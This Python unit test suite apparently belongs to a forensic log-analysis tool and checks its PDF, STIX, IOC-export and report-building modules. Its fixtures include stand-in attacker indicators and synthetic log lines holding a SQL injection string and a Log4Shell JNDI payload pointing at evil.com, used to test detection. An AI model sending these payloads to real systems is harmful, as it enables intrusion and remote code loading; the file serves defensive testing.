"""
tests/unit/test_layer4.py â€” NexLog Layer 4
Test suite for all output/ modules:
  - pdf_report   â€” PDFReport (reportlab)
  - stix_export  â€” STIXExport (stdlib)
  - ioc_csv      â€” IOCExporter (6 formats)
  - report_builder â€” ReportBuilder (JSON/text/markdown)
  - output/__init__ exports

Run: python test_layer4.py  (from any directory)
"""

import json
import os
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

# â”€â”€ Self-locating path â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

_root = os.path.dirname(os.path.abspath(__file__))
for _ in range(8):
    if os.path.isfile(os.path.join(_root, 'pathconfig.py')):
        break
    _root = os.path.dirname(_root)
if _root not in sys.path:
    sys.path.insert(0, _root)
from pathconfig import ROOT, add_root
add_root()
_ROOT = ROOT
for _p in ['core', 'detection', 'storage', 'intelligence', 'output',
         'utils', 'interface/web', 'interface/gui']:
    sys.path.insert(0, os.path.join(_ROOT, _p))

from finding import Finding, Severity, MitreTag
from ioc_extractor import IOC, IOCExtractor
from case_db import CaseDB
from report_builder import ReportBuilder
from pdf_report import PDFReport, _apply_graph_backdrop, _attack_chain_node_graph, _topology_graph
from stix_export import STIXExport, _stix_id, _ts
from ioc_csv import IOCExporter
from reportlab.graphics.shapes import Drawing

# â”€â”€ Test helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_passed = _failed = 0

def check(name: str, cond: bool, detail: str = "") -> None:
    global _passed, _failed
    if cond:
        _passed += 1; print(f"  PASS  {name}")
    else:
        _failed += 1; print(f"  FAIL  {name}" + (f"  [{detail}]" if detail else ""))

_TS = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

def _f(rule_id="WEB-001", cat="web_attack", sev=Severity.HIGH,
       conf=0.90, src="203.0.113.5", host="web01") -> Finding:
    return Finding(
        rule_id=rule_id, rule_name=f"Rule {rule_id}", description="test finding",
        severity=sev, confidence=conf, category=cat,
        mitre_tags=[MitreTag("TA0001","Initial Access","T1190","Exploit",".001")],
        source_ip=src, hostname=host, process_name="nginx", event_id="4688",
        timestamp=_TS, trigger_line=f"GET /?rule={rule_id}",
        supporting_lines=["evidence line 1", "evidence line 2"],
    )

def _ioc(typ="ipv4", val="203.0.113.5", conf=0.87,
         rule="WEB-001", tags=None) -> IOC:
    return IOC(typ, val, conf, rule, "203.0.113.5",
               "2026-01-04T10:00:00+00:00", tags or ["web_attack","T1190.001"])

FINDINGS = [
    _f("WEB-001","web_attack",  Severity.HIGH,     0.90, "203.0.113.5","web01"),
    _f("AUTH-001","auth",       Severity.CRITICAL,  0.95, "185.220.100.5","bastion"),
    _f("DISC-008","discovery",  Severity.CRITICAL,  0.96, "1.2.3.4","app01"),
    _f("PERS-006","persistence",Severity.HIGH,      0.85, "10.0.0.5","srv02"),
    _f("RECON-002","recon",     Severity.MEDIUM,    0.80, "9.9.9.9","web01"),
    _f("MAL-001","malware",     Severity.CRITICAL,  0.88, "185.220.100.5","bastion"),
]
CHAINS = [{
    "chain_name":     "Full Web Compromise",
    "source_ip":      "203.0.113.5",
    "categories":     ["recon","web_attack","persistence"],
    "finding_count":  3,
    "max_risk_score": 8.5,
    "confidence_boost": 0.15,
}]
EVIDENCE = [{
    "file_path":   "/var/log/nginx/access.log",
    "sha256":      "a" * 64,
    "file_size":   204800,
    "format":      "apache_combined",
    "ingested_at": "2026-01-04T10:00:00+00:00",
    "lines_parsed":  1500,
    "findings_count": 6,
}]
IOCS = [
    _ioc("ipv4",        "203.0.113.5",   0.90),
    _ioc("ipv4",        "185.220.100.5", 0.95, tags=["auth","tor_exit"]),
    _ioc("domain",      "evil.com",      0.80, tags=["web_attack"]),
    _ioc("hash_sha256", "a"*64,          0.85, tags=["malware"]),
    _ioc("url",         "https://evil.com/shell.php", 0.82),
    _ioc("hostname",    "attacker-c2.net", 0.78),
    _ioc("user_agent",  "sqlmap/1.7",    0.92, tags=["web_attack"]),
]


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 1. Procedural graphics helpers
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_procedural_graphics():
    print("\nâ”€â”€ 1. Procedural graphics helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")

    # _apply_graph_backdrop â€” drawing must have objects after call
    d = Drawing(200, 80)
    before = len(d.contents)
    _apply_graph_backdrop(d, 200, 80)
    check("backdrop adds objects",        len(d.contents) > before)
    check("backdrop is deterministic",
          _apply_graph_backdrop(Drawing(200,80),200,80) is None)  # no return val

    # _attack_chain_node_graph â€” chain with categories
    g1 = _attack_chain_node_graph(CHAINS[0], width=300, height=80)
    check("chain graph returns Drawing",  isinstance(g1, Drawing))
    check("chain graph has content",      len(g1.contents) > 3)

    # Empty chain â€” fallback text
    g2 = _attack_chain_node_graph({"categories": []}, width=200, height=60)
    check("empty chain returns Drawing",  isinstance(g2, Drawing))

    # _topology_graph â€” with IPâ†”hostname pairs
    g3 = _topology_graph(FINDINGS[:3], width=300, height=150)
    check("topology returns Drawing",     isinstance(g3, Drawing))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 2. PDFReport â€” full build with all sections
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_pdf_report_build():
    print("\nâ”€â”€ 2. PDFReport full build â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        out = Path(f.name)
    try:
        pdf = PDFReport(
            findings       = FINDINGS,
            chains         = CHAINS,
            evidence       = EVIDENCE,
            iocs           = IOCS,
            case_ref       = "IR-2026-TEST",
            analyst        = "Test Analyst",
            org            = "Test Org",
            classification = "TLP:AMBER",
        )
        result = pdf.build(out)
        check("build returns Path",       isinstance(result, Path))
        check("file exists",              out.exists())
        size = out.stat().st_size
        check("file not empty",           size > 10_000, f"got {size}")
        header = out.read_bytes()[:8]
        check("valid PDF header",         header.startswith(b"%PDF-"),
              f"got {header}")
    finally:
        out.unlink(missing_ok=True)


def test_pdf_report_no_findings():
    print("\nâ”€â”€ 3. PDFReport â€” empty findings â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        out = Path(f.name)
    try:
        pdf = PDFReport(findings=[], chains=[], evidence=[],
                        case_ref="IR-EMPTY")
        pdf.build(out)
        check("empty PDF builds",         out.stat().st_size > 1000)
        check("valid header on empty",
              out.read_bytes()[:5] == b"%PDF-")
    finally:
        out.unlink(missing_ok=True)


def test_pdf_report_from_db():
    print("\nâ”€â”€ 4. PDFReport from CaseDB â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f:
        db_path = f.name
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        pdf_path = Path(f.name)
    try:
        with CaseDB(db_path) as db:
            sid = db.create_session(source_file="test.log",
                                    sha256="b"*64, file_size=1024)
            db.save_findings(FINDINGS, sid)
            db.record_evidence("test.log","b"*64,1024,sid,"syslog",100,6)
            db.save_attack_chains(CHAINS, sid)

            pdf = PDFReport(db=db, session_id=sid,
                            case_ref="IR-DB-TEST", analyst="DB Analyst")
            pdf.build(pdf_path)

        check("DB-sourced PDF exists",    pdf_path.exists())
        check("DB-sourced PDF valid",
              pdf_path.read_bytes()[:5] == b"%PDF-")
        check("DB-sourced PDF non-empty", pdf_path.stat().st_size > 5000)
    finally:
        os.unlink(db_path)
        pdf_path.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 5. STIXExport â€” object graph structure
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_stix_export_helpers():
    print("\nâ”€â”€ 5. STIX helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    sid = _stix_id("indicator")
    check("stix_id format",         sid.startswith("indicator--"))
    check("stix_id has uuid",       len(sid) == len("indicator--") + 36)

    ts_str = _ts()
    check("_ts produces Z suffix",  ts_str.endswith("Z"))
    check("_ts no microseconds",    "." not in ts_str)

    ts_dt = _ts(datetime(2026,1,4,10,0,0,tzinfo=timezone.utc))
    check("_ts from datetime",      ts_dt == "2026-01-04T10:00:00Z")


def test_stix_export_build():
    print("\nâ”€â”€ 6. STIXExport bundle structure â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    sx     = STIXExport(findings=FINDINGS, iocs=IOCS,
                        case_ref="IR-2026-STIX", analyst="Test",
                        tlp_level="amber")
    bundle = sx.build()
    summ   = sx.summary()

    check("bundle type",            bundle["type"] == "bundle")
    check("bundle spec_version",    bundle["spec_version"] == "2.1")
    check("bundle has id",          bundle["id"].startswith("bundle--"))
    check("objects list present",   isinstance(bundle["objects"], list))
    check("objects non-empty",      len(bundle["objects"]) > 5)

    types = {o["type"] for o in bundle["objects"]}
    check("has identity",           "identity" in types)
    check("has marking-definition", "marking-definition" in types)
    check("has attack-pattern",     "attack-pattern" in types,
          f"types={types}")
    check("has threat-actor",       "threat-actor" in types,
          f"types={types}")
    check("has indicator",          "indicator" in types)
    check("has course-of-action",   "course-of-action" in types)
    check("has relationship",       "relationship" in types)

    check("summary attack_patterns > 0",  summ["attack_patterns"] > 0)
    check("summary indicators > 0",       summ["indicators"] > 0)
    check("summary relationships > 0",    summ["relationships"] > 0)
    check("summary bundle_objects > 10",  summ["bundle_objects"] > 10)

    # Every non-marking object must have spec_version + id
    for obj in bundle["objects"]:
        if obj["type"] == "marking-definition":
            continue
        check(f"obj {obj['type']} has spec_version",
              "spec_version" in obj)
        check(f"obj {obj['type']} has id",
              "--" in obj.get("id",""))

    # All IDs follow <type>--<uuid4> format
    for obj in bundle["objects"]:
        oid = obj.get("id","")
        if "--" in oid:
            prefix = oid.split("--")[0]
            check(f"id prefix matches type ({prefix})",
                  obj["type"] == prefix or
                  obj["type"] == "marking-definition")


def test_stix_export_tlp_levels():
    print("\nâ”€â”€ 7. STIXExport TLP levels â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    for level in ["white","green","amber","red"]:
        sx  = STIXExport(findings=FINDINGS[:2], iocs=[], tlp_level=level)
        b   = sx.build()
        markings = [o for o in b["objects"] if o["type"]=="marking-definition"]
        check(f"TLP:{level.upper()} marking created", len(markings) == 1)
        stmt = markings[0]["definition"]["statement"]
        check(f"TLP:{level.upper()} in statement",
              level.upper() in stmt.upper())


def test_stix_export_write():
    print("\nâ”€â”€ 8. STIXExport write to file â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        path = Path(f.name)
    try:
        sx   = STIXExport(findings=FINDINGS, iocs=IOCS, case_ref="IR-TEST")
        result = sx.write(path)
        check("write returns Path",    isinstance(result, Path))
        check("file exists",           path.exists())
        loaded = json.loads(path.read_text(encoding="utf-8"))
        check("file is valid JSON",    loaded["type"] == "bundle")
        check("file spec_version",     loaded["spec_version"] == "2.1")
    finally:
        path.unlink(missing_ok=True)


def test_stix_export_empty():
    print("\nâ”€â”€ 9. STIXExport â€” empty inputs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    sx = STIXExport(findings=[], iocs=[], case_ref="IR-EMPTY")
    b  = sx.build()
    check("empty bundle valid",        b["type"] == "bundle")
    check("empty has identity",
          any(o["type"]=="identity" for o in b["objects"]))
    check("empty has marking",
          any(o["type"]=="marking-definition" for o in b["objects"]))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 10. IOCExporter â€” all six formats
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_ioc_exporter_csv():
    print("\nâ”€â”€ 10. IOCExporter â€” CSV â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp = IOCExporter(IOCS, case_ref="IR-2026", analyst="Test")
    csv = exp.to_csv()
    check("CSV is string",             isinstance(csv, str))
    check("CSV has comment header",    "# NexLog" in csv)
    check("CSV has type column",       "type" in csv)
    check("CSV has data rows",         csv.count("\n") > 3)
    check("CSV has source IP",         "203.0.113.5" in csv)
    check("CSV has case_ref column",   "case_ref" in csv)


def test_ioc_exporter_tsv():
    print("\nâ”€â”€ 11. IOCExporter â€” TSV â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp = IOCExporter(IOCS, case_ref="IR-2026")
    tsv = exp.to_tsv()
    check("TSV has tabs",              "\t" in tsv)
    check("TSV has header line",       "type\tvalue" in tsv)
    check("TSV has data",              tsv.count("\n") > 2)
    check("TSV has IP value",          "203.0.113.5" in tsv)


def test_ioc_exporter_jsonl():
    print("\nâ”€â”€ 12. IOCExporter â€” JSONL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp  = IOCExporter(IOCS, case_ref="IR-2026")
    jsonl = exp.to_jsonl()
    lines = [l for l in jsonl.strip().splitlines() if l]
    check("JSONL has lines",           len(lines) == len(IOCS))
    for line in lines:
        rec = json.loads(line)
        check("JSONL record has type",     "type" in rec)
        check("JSONL record has value",    "value" in rec)
        check("JSONL has case_ref",        rec.get("case_ref") == "IR-2026")


def test_ioc_exporter_zeek():
    print("\nâ”€â”€ 13. IOCExporter â€” Zeek Intel â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp  = IOCExporter(IOCS, case_ref="IR-2026")
    zeek = exp.to_zeek_intel()
    check("Zeek has #fields line",     "#fields" in zeek)
    check("Zeek has Intel::ADDR",      "Intel::ADDR" in zeek)
    check("Zeek has meta.do_notice=T", "T" in zeek)
    check("Zeek tab-delimited",        "\t" in zeek)
    # Every non-comment data row must have 6 tab-separated fields
    data_rows = [l for l in zeek.splitlines()
                 if l and not l.startswith("#")]
    for row in data_rows:
        fields = row.split("\t")
        check(f"Zeek row has 6 fields ({fields[0][:20]})",
              len(fields) == 6)


def test_ioc_exporter_misp():
    print("\nâ”€â”€ 14. IOCExporter â€” MISP CSV â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp  = IOCExporter(IOCS, case_ref="IR-2026")
    misp = exp.to_misp_csv()
    check("MISP has uuid column",      "uuid" in misp)
    check("MISP has type column",      "type" in misp)
    check("MISP has to_ids column",    "to_ids" in misp)
    lines = [l for l in misp.strip().splitlines() if l]
    check("MISP has header + data",    len(lines) > 1)
    # Every data row uuid must be 36 chars (UUID4)
    import csv as _csv
    from io import StringIO
    reader = _csv.DictReader(StringIO(misp))
    for row in reader:
        check(f"MISP uuid is UUID4 ({row['value'][:20]})",
              len(row["uuid"]) == 36)


def test_ioc_exporter_blocklist():
    print("\nâ”€â”€ 15. IOCExporter â€” Blocklist â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp = IOCExporter(IOCS, case_ref="IR-2026")
    bl  = exp.to_blocklist("ipv4", min_confidence=0.5)
    check("Blocklist has comment header", "# NexLog" in bl)
    check("Blocklist has IP",             "203.0.113.5" in bl or
                                          "185.220.100.5" in bl)
    check("Blocklist has rule comment",   "WEB-001" in bl or "AUTH-001" in bl)

    # Domain blocklist
    bl_d = exp.to_blocklist("domain", min_confidence=0.5)
    check("Domain blocklist has domain",  "evil.com" in bl_d)

    # Confidence filter works
    bl_hi = exp.to_blocklist("ipv4", min_confidence=0.99)
    data  = [l for l in bl_hi.splitlines()
             if l and not l.startswith("#") and l.strip()]
    check("High conf filter works",       len(data) == 0)


def test_ioc_exporter_write_all():
    print("\nâ”€â”€ 16. IOCExporter â€” write_all â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp = IOCExporter(IOCS, case_ref="IR-2026-001", analyst="Test")
    with tempfile.TemporaryDirectory() as d:
        paths = exp.write_all(d)
        check("write_all returns dict",   isinstance(paths, dict))
        check("csv written",              "csv" in paths and paths["csv"].exists())
        check("tsv written",              "tsv" in paths and paths["tsv"].exists())
        check("jsonl written",            "jsonl" in paths and paths["jsonl"].exists())
        check("zeek written",             "zeek_intel" in paths)
        check("misp written",             "misp_csv" in paths)
        check("ip blocklist written",     "blocklist_ipv4" in paths)
        # All files are non-empty
        for fmt, p in paths.items():
            check(f"{fmt} file non-empty",  p.stat().st_size > 0,
                  f"size={p.stat().st_size}")


def test_ioc_exporter_min_confidence():
    print("\nâ”€â”€ 17. IOCExporter â€” min_confidence filter â”€â”€")
    all_exp = IOCExporter(IOCS, min_confidence=0.0)
    hi_exp  = IOCExporter(IOCS, min_confidence=0.95)
    check("no filter keeps all",      len(all_exp._iocs) == len(IOCS))
    check("high filter reduces",      len(hi_exp._iocs) < len(IOCS))
    check("high filter correct",
          all(i.confidence >= 0.95 for i in hi_exp._iocs))


def test_ioc_exporter_summary():
    print("\nâ”€â”€ 18. IOCExporter â€” summary â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    exp  = IOCExporter(IOCS, case_ref="IR-2026")
    summ = exp.summary()
    check("summary has total",         summ["total"] == len(IOCS))
    check("summary has by_type",       isinstance(summ["by_type"], dict))
    check("summary has avg_confidence",0 < summ["avg_confidence"] <= 1.0)
    check("summary has top_rules",     isinstance(summ["top_rules"], dict))
    check("summary has case_ref",      summ["case_ref"] == "IR-2026")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 19. ReportBuilder â€” all three text formats
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_report_builder_formats():
    print("\nâ”€â”€ 19. ReportBuilder â€” all formats â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f:
        db_path = f.name
    try:
        with CaseDB(db_path) as db:
            sid = db.create_session(source_file="test.log",
                                    sha256="c"*64, file_size=4096,
                                    rules_loaded=162, entries_parsed=500)
            db.save_findings(FINDINGS, sid)
            db.record_evidence("test.log","c"*64,4096,sid,"apache",500,6)
            db.save_attack_chains(CHAINS, sid)
            db.add_note("Test analyst note", sid, "analyst")

            builder = ReportBuilder(db, session_id=sid)

            # JSON
            jr = json.loads(builder.to_json())
            check("JSON has report_meta",      "report_meta" in jr)
            check("JSON has exec summary",     "executive_summary" in jr)
            check("JSON has timeline",         "timeline" in jr)
            check("JSON has attack_chains",    len(jr["attack_chains"]) == 1)
            check("JSON has hardening",        len(jr["hardening_recommendations"]) > 0)
            check("JSON has chain_of_custody", "chain_of_custody" in jr)
            check("JSON has integrity_summary", "integrity_summary" in jr)
            check("JSON has evidence_verifications", "evidence_verifications" in jr)
            check("JSON has analyst_action_trail", "analyst_action_trail" in jr)
            check("JSON has finding_provenance", "finding_provenance" in jr)
            es = jr["executive_summary"]
            check("JSON has max_risk_score",   "max_risk_score" in es)
            check("JSON has affected_hosts",   "affected_hosts" in es)
            check("JSON has attacker_ips",     "attacker_ips" in es)
            check("JSON timeline has hostname",
                  all("hostname" in e for e in jr["timeline"]))
            check("JSON timeline has risk_score",
                  all("risk_score" in e for e in jr["timeline"]))

            # Text
            txt = builder.to_text()
            check("text has EXECUTIVE SUMMARY",   "EXECUTIVE SUMMARY" in txt)
            check("text has Affected hosts",       "Affected hosts" in txt)
            check("text has Max risk score",        "Max risk score" in txt)
            check("text has CHAIN OF CUSTODY",      "CHAIN OF CUSTODY" in txt)
            check("text has EVIDENCE INTEGRITY",    "EVIDENCE INTEGRITY" in txt)
            check("text has HARDENING",             "HARDENING" in txt)
            check("text has ANALYST NOTES",         "ANALYST NOTES" in txt)
            check("text has ATTACK CHAINS",         "ATTACK CHAINS" in txt)

            # Markdown
            md = builder.to_markdown()
            check("markdown starts with #",        md.startswith("# Forensic"))
            check("markdown has ## Timeline",       "## Timeline" in md)
            check("markdown table has Host col",    "| Host |" in md)
            check("markdown has ## Hardening",      "## Hardening" in md)
            check("markdown has ## Evidence Integrity", "## Evidence Integrity" in md)
            check("markdown has ## Chain",          "## Chain of Custody" in md)
            check("markdown has Analyst Notes",     "## Analyst Notes" in md)
    finally:
        os.unlink(db_path)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 20. output/__init__ package exports
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_output_package_exports():
    print("\nâ”€â”€ 20. output/__init__ package exports â”€â”€â”€â”€â”€â”€â”€")
    sys.path.insert(0, _ROOT)
    import output as out_pkg
    check("ReportBuilder exported",  hasattr(out_pkg, "ReportBuilder"))
    check("PDFReport exported",      hasattr(out_pkg, "PDFReport"))
    check("STIXExport exported",     hasattr(out_pkg, "STIXExport"))
    check("IOCExporter exported",    hasattr(out_pkg, "IOCExporter"))

    check("ReportBuilder importable", True)
    check("PDFReport importable",    True)
    check("STIXExport importable",   True)
    check("IOCExporter importable",  True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 21. Full Layer 1 â†’ Layer 4 pipeline
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_full_l1_to_l4_pipeline():
    print("\nâ”€â”€ 21. Full L1â†’L4 pipeline â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    rules_path = os.path.join(_ROOT, "detection", "rules")
    if not os.path.exists(rules_path):
        print("  SKIP  rules dir not found"); return

    sys.path.insert(0, os.path.join(_ROOT, "core"))
    from engine import Engine
    from rule_engine import RuleEngine

    log_lines = [
        '203.0.113.5 - - [04/Jan/2026:10:00:00 +0000] '
        '"GET /login?user=admin\'+OR+1=1-- HTTP/1.1" 200 512 "-" "sqlmap/1.7"',
        '185.220.100.5 - - [04/Jan/2026:10:00:01 +0000] '
        '"GET / HTTP/1.1" 200 100 "-" "${jndi:ldap://evil.com/x}"',
        '9.9.9.9 - - [04/Jan/2026:10:00:02 +0000] '
        '"GET /admin1 HTTP/1.1" 404 0 "-" "gobuster/3.0"',
    ]

    with tempfile.NamedTemporaryFile(mode="w", suffix=".log",
                                     delete=False, encoding="utf-8") as f:
        f.write("\n".join(log_lines) + "\n")
        log_tmp = f.name
    with tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f:
        db_tmp = f.name
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        pdf_tmp = Path(f.name)
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        stix_tmp = Path(f.name)

    try:
        parse  = Engine()
        detect = RuleEngine(rules_path)
        all_f  = []
        for entry in parse.parse(log_tmp):
            all_f.extend(detect.evaluate(entry))
        check("L1â†’L2 findings produced",   len(all_f) > 0)

        with CaseDB(db_tmp) as db:
            sid = db.create_session(
                source_file=log_tmp,
                sha256=parse.file_meta.get("sha256",""),
                file_size=parse.file_meta.get("size",0),
                rules_loaded=detect._rules_loaded,
            )
            db.save_findings(all_f, sid)
            db.record_evidence(log_tmp,
                parse.file_meta.get("sha256",""),
                parse.file_meta.get("size",0),
                sid, lines_parsed=detect._total_evaluated,
                findings_count=len(all_f))

            # Layer 4a: PDF
            pdf = PDFReport(db=db, session_id=sid,
                            case_ref="IR-PIPELINE-TEST")
            pdf.build(pdf_tmp)
            check("PDF from real parse",    pdf_tmp.stat().st_size > 5000)
            check("PDF valid header",
                  pdf_tmp.read_bytes()[:5] == b"%PDF-")

            # Layer 4b: STIX
            findings = db.get_findings(session_id=sid)
            iocs     = IOCExtractor().extract(findings)
            sx       = STIXExport(findings=findings, iocs=iocs)
            sx.write(stix_tmp)
            b = json.loads(stix_tmp.read_text(encoding="utf-8"))
            check("STIX from real parse",   b["type"] == "bundle")
            check("STIX has indicators",    sx.summary()["indicators"] >= 0)

            # Layer 4c: IOC CSV
            exp = IOCExporter(iocs, case_ref="IR-PIPELINE")
            csv = exp.to_csv()
            check("IOC CSV from pipeline",  "type" in csv)
            jsonl = exp.to_jsonl()
            check("JSONL from pipeline",    len(jsonl.strip()) > 0)

    finally:
        os.unlink(log_tmp)
        os.unlink(db_tmp)
        pdf_tmp.unlink(missing_ok=True)
        stix_tmp.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# main
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
if __name__ == "__main__":
    print("=" * 60)
    print("  NexLog Layer 4 â€” Test Suite")
    print("=" * 60)

    test_procedural_graphics()
    test_pdf_report_build()
    test_pdf_report_no_findings()
    test_pdf_report_from_db()
    test_stix_export_helpers()
    test_stix_export_build()
    test_stix_export_tlp_levels()
    test_stix_export_write()
    test_stix_export_empty()
    test_ioc_exporter_csv()
    test_ioc_exporter_tsv()
    test_ioc_exporter_jsonl()
    test_ioc_exporter_zeek()
    test_ioc_exporter_misp()
    test_ioc_exporter_blocklist()
    test_ioc_exporter_write_all()
    test_ioc_exporter_min_confidence()
    test_ioc_exporter_summary()
    test_report_builder_formats()
    test_output_package_exports()
    test_full_l1_to_l4_pipeline()

    print(f"\n{'=' * 60}")
    print(f"  Results:  {_passed} passed Â· {_failed} failed")
    print(f"{'=' * 60}")
    if _failed:
        raise SystemExit(1)
